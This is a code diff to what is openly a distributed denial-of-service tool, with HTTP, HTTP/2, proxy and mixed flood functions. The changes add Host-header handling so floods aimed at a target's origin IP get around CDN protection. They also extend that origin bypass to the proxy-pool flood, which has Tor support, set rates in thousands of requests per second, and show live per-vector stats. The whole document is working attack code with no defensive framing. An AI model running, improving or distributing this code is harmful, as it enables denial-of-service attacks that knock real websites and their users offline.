@@ -1592,17 +1592,10 @@ async def run_http_flood(target: str, cfg: dict):
         if parsed.query:
             path += "?" + parsed.query
         effective_url = f"{scheme}://{opts['origin_ip']}{path}"
-        # Inject Host header context via SNI is not possible here; the multi-vector
-        # engine builds raw requests with Host: <origin_ip>, which most CDNs reject.
-        # When origin is reachable we usually still want the original Host header,
-        # so we keep target_url with hostname but route via origin via DNS pinning.
-        # The MV engine resolves at TCP layer; sending Host: <origin> can still hit
-        # the origin server, so prefer the path that uses the origin IP directly.
-        effective_url = f"{scheme}://{opts['origin_ip']}{path}"
 
     print(f"\n {c('c','[*]')} HTTP Flood | {target} | {duration}s | {rps} RPS")
     if opts.get("origin_ip"):
-        print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']}")
+        print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']} (Host: {host_header})")
     if opts.get("proxy_pool"):
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
     _rich_sep()
@@ -1623,6 +1616,10 @@ async def run_http_flood(target: str, cfg: dict):
                         proxy_urls.append(u)
         except Exception:
             proxy_urls = []
+
+    # Resolve host_header for origin bypass (SNI + HTTP Host header)
+    parsed_target = urlparse(target)
+    host_header = opts.get("host_header") or parsed_target.hostname or ""
 
     # Spin up the AutoDashboard for live per-vector RPS rendering.
     from core.monitor.auto_dashboard import AutoDashboard
@@ -1684,6 +1681,7 @@ async def run_http_flood(target: str, cfg: dict):
                 proxy_urls=proxy_urls if proxy_urls else None,
                 result_dict=result,
                 vector_mode=mode,
+                host_header=host_header,
             ),
             daemon=True,
         )
@@ -1765,6 +1763,9 @@ async def run_http2_flood(target: str, cfg: dict):
     
     opts = await prompt_attack_options(target)
 
+    parsed_h2 = urlparse(target)
+    host_header = opts.get("host_header") or parsed_h2.hostname or ""
+
     print(f"\n {c('c','[*]')} HTTP/2 Flood | {target} | {duration}s | {rps} RPS")
     if opts["origin_ip"]:
         print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']}")
@@ -1794,7 +1795,7 @@ async def run_http2_flood(target: str, cfg: dict):
             result = await run_enhanced_attack(
                 url=target, duration=duration, method="http_get_flood",
                 rps=rps, proxy_pool=opts["proxy_pool"], origin_ip=opts["origin_ip"],
-                live_stats=vec
+                host_header=host_header, live_stats=vec
             )
             vec["status"] = "done"
         else:
@@ -2002,6 +2003,11 @@ async def run_proxy_flood(target: str, cfg: dict):
     duration = int(get_input(" Duration (seconds, default 300): ") or "300")
     rps = int(get_input(" Target RPS (default 3000): ") or "3000")
     
+    # Attack options (origin bypass, host header, etc.)
+    opts = await prompt_attack_options(target)
+    parsed_pf = urlparse(target)
+    host_header = opts.get("host_header") or parsed_pf.hostname or ""
+    
     # Proxy selection with Tor support
     print(f"\n {c('c','[*]')} Proxy for Proxy Flood:")
     print(f"   {c('c','[1]')} Load from proxy file")
@@ -2058,13 +2064,17 @@ async def run_proxy_flood(target: str, cfg: dict):
         print(f" {c('g','[+]')} {alive} proxies alive")
 
     print(f"\n {c('c','[*]')} Proxy Flood | {target} | {duration}s | {rps} RPS")
+    if opts.get("origin_ip"):
+        print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']} (Host: {host_header})")
     _rich_sep()
     
     health_task = asyncio.create_task(proxy_pool.health_loop())
     
     result = await run_enhanced_attack(
         url=target, duration=duration, method="http_get_flood",
-        rps=rps, proxy_pool=proxy_pool
+        rps=rps, proxy_pool=proxy_pool,
+        origin_ip=opts.get("origin_ip") or "",
+        host_header=host_header,
     )
     
     health_task.cancel()
@@ -2288,13 +2298,14 @@ async def run_mixed_attack(target: str, cfg: dict):
 
     # Build effective target URL (origin bypass)
     effective_url = target
+    host_header = parsed.hostname or ""
     if origin_ip:
         scheme = parsed.scheme or "https"
         path = parsed.path or "/"
         if parsed.query:
             path += "?" + parsed.query
         effective_url = f"{scheme}://{origin_ip}{path}"
-        print(f" {c('g','[+]')} Origin bypass: {origin_ip} -> {effective_url}")
+        print(f" {c('g','[+]')} Origin bypass: {origin_ip} (Host: {host_header})")
 
     print(f"\n {c('c','[*]')} MIXED v2 | {target} | {duration}s | {rps} RPS | proxies={len(proxy_urls)}")
     _rich_sep()
@@ -2361,6 +2372,7 @@ async def run_mixed_attack(target: str, cfg: dict):
                 proxy_urls=proxy_urls if proxy_urls else None,
                 result_dict=result,
                 vector_mode=mode,
+                host_header=host_header,
             ),
             daemon=True,
         )
